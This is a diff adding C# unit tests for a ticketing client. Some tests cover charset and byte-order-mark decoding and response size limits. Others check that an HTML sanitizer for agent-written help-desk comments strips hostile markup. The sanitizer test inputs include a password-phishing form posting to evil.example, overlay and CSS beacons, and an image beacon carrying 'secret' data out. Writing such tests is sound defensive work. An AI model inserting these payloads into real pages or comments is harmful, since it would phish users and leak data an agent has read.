@@ -73,6 +73,61 @@ public sealed class HardeningTests
     }
 
     [Fact]
+    public async Task A_response_with_a_byte_order_mark_still_parses()
+    {
+        byte[] bom = [.. Encoding.UTF8.GetPreamble(), .. Encoding.UTF8.GetBytes("""{"items":[{"id":"abc","title":"Café"}],"itemCount":1}""")];
+        var handler = new FakeHttpHandler().Enqueue(_ => new HttpResponseMessage(HttpStatusCode.OK)
+        {
+            Content = new ByteArrayContent(bom) { Headers = { ContentType = new("application/json") } },
+        });
+        TicketingClient client = TestFactory.Client(handler);
+
+        ListResponse<Ticket> r = await client.ListTicketsAsync(new TicketListQuery(), Ct);
+
+        Assert.Equal("Café", Assert.Single(r.Items!).Title);
+    }
+
+    [Fact]
+    public async Task A_response_in_a_declared_charset_is_decoded_with_it()
+    {
+        byte[] latin1 = Encoding.Latin1.GetBytes("""{"items":[{"id":"abc","title":"Café"}],"itemCount":1}""");
+        var handler = new FakeHttpHandler().Enqueue(_ => new HttpResponseMessage(HttpStatusCode.OK)
+        {
+            Content = new ByteArrayContent(latin1) { Headers = { ContentType = new("application/json") { CharSet = "iso-8859-1" } } },
+        });
+        TicketingClient client = TestFactory.Client(handler);
+
+        ListResponse<Ticket> r = await client.ListTicketsAsync(new TicketListQuery(), Ct);
+
+        Assert.Equal("Café", Assert.Single(r.Items!).Title);
+    }
+
+    [Fact]
+    public async Task An_unknown_charset_falls_back_to_utf8()
+    {
+        var handler = new FakeHttpHandler().Enqueue(_ => new HttpResponseMessage(HttpStatusCode.OK)
+        {
+            Content = new ByteArrayContent(Encoding.UTF8.GetBytes("""{"items":[{"id":"abc","title":"Café"}]}""")) { Headers = { ContentType = new("application/json") { CharSet = "no-such-charset" } } },
+        });
+        TicketingClient client = TestFactory.Client(handler);
+
+        ListResponse<Ticket> r = await client.ListTicketsAsync(new TicketListQuery(), Ct);
+
+        Assert.Equal("Café", Assert.Single(r.Items!).Title);
+    }
+
+    [Fact]
+    public async Task The_size_limit_message_is_readable_below_one_megabyte()
+    {
+        var handler = new FakeHttpHandler().Enqueue(HttpStatusCode.OK, PaddedJson(200 * 1024));
+        TicketingClient client = TestFactory.Client(handler, TestFactory.Options(o => o.MaxResponseBytes = 128 * 1024));
+
+        TicketingApiException ex = await Assert.ThrowsAsync<TicketingApiException>(() => client.ListTicketsAsync(new TicketListQuery(), Ct));
+
+        Assert.Contains("over 128 KB", ex.Message, StringComparison.Ordinal);
+    }
+
+    [Fact]
     public async Task A_response_body_that_never_finishes_times_out()
     {
         var handler = new FakeHttpHandler().Enqueue(_ => new HttpResponseMessage(HttpStatusCode.OK)
@@ -107,6 +162,55 @@ public sealed class HardeningTests
         Assert.DoesNotContain("onerror", clean, StringComparison.OrdinalIgnoreCase);
         Assert.DoesNotContain("javascript:", clean, StringComparison.OrdinalIgnoreCase);
         Assert.DoesNotContain("<iframe", clean, StringComparison.OrdinalIgnoreCase);
+    }
+
+    [Theory]
+    // A working credential-phishing form.
+    [InlineData("<form action=\"https://evil.example/steal\" method=\"post\"><input name=\"password\" type=\"password\"><button>Sign in</button></form>ok", "<form", "<input", "<button", "evil.example")]
+    // A full-screen overlay, and a CSS beacon.
+    [InlineData("<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999\">ok</div><p style=\"background:url(https://evil.example/b)\">p</p>", "style", "position", "evil.example")]
+    // A zero-click beacon that could carry data the agent read.
+    [InlineData("<img src=\"https://evil.example/pixel.gif?data=secret\">ok", "<img", "evil.example")]
+    // DOM clobbering and reverse tabnabbing.
+    [InlineData("<a name=\"config\" href=\"https://example.com\" target=\"_blank\">ok</a>", "name=", "target=")]
+    // Removed with their content, which for form controls is safer than keeping it.
+    [InlineData("<textarea>t</textarea><select><option>o</option></select><label>l</label>ok", "<textarea", "<select", "<option", "<label")]
+    public void Html_that_could_phish_overlay_or_beacon_is_removed(string html, params string[] mustNotContain)
+    {
+        string clean = ToolValidation.OptionalHtml(html, "commentHtml")!;
+
+        Assert.Contains("ok", clean, StringComparison.Ordinal);
+        foreach (string fragment in mustNotContain)
+        {
+            Assert.DoesNotContain(fragment, clean, StringComparison.OrdinalIgnoreCase);
+        }
+    }
+
+    [Fact]
+    public void Html_formatting_that_help_desk_comments_use_survives()
+    {
+        const string html =
+            "<h2>Steps</h2><ol><li><b>Bold</b> and <i>italic</i></li><li><code>cmd</code></li></ol>" +
+            "<table><tr><th>Key</th><td>Value</td></tr></table><blockquote>quote</blockquote>" +
+            "<p><a href=\"https://example.com/kb/42\" title=\"KB\">KB article</a></p>";
+
+        string clean = ToolValidation.OptionalHtml(html, "commentHtml")!;
+
+        foreach (string kept in (string[])["<h2>", "<ol>", "<li>", "<b>Bold</b>", "<i>italic</i>", "<code>cmd</code>", "<table>", "<th>Key</th>", "<blockquote>", "href=\"https://example.com/kb/42\""])
+        {
+            Assert.Contains(kept, clean, StringComparison.Ordinal);
+        }
+    }
+
+    [Fact]
+    public void Html_wrapped_in_a_document_keeps_its_content()
+    {
+        // html, head and body aren't allowed, and removed tags take their content with them, so this checks that a
+        // whole-document wrapper (which agents sometimes produce) doesn't erase the comment.
+        string clean = ToolValidation.OptionalHtml("<html><head><title>t</title></head><body><p>Kept</p></body></html>", "commentHtml")!;
+
+        Assert.Contains("<p>Kept</p>", clean, StringComparison.Ordinal);
+        Assert.DoesNotContain("<body", clean, StringComparison.OrdinalIgnoreCase);
     }
 
     [Fact]
